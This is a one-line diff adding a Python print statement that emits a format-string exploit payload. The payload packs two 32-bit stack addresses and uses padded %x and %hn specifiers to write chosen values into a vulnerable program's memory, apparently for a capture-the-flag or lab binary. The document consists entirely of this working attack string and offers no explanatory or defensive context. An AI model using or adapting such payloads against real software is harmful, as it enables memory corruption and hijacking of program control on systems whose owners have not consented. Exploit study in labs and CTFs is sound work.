@@ -1,0 +1,1 @@
+print(b'AAAA\x1e\xde\xff\xff\x1c\xde\xff\xff%57272x%3$hn%8251x%2$hn')
